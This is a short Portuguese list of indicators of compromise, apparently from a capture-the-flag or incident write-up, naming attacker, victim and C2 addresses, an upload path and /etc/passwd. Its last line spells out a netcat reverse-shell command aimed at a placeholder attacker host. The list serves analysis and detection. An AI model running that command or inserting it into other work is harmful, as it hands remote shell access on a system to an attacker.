**IoCs (generalizados, sem spoilers)**

- IP externo suspeito: 198.51.100.25
- Servidor vítima: 192.0.2.10
- Possível C2 (destino outbound): 203.0.113.10:8080
- Padrões HTTP: uploads em /reviews/upload.php e diretório /reviews/uploads/
- Artefato sensível (exemplo genérico): /etc/passwd

- Padrão de comando (generalizado): `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8080 >/tmp/f`
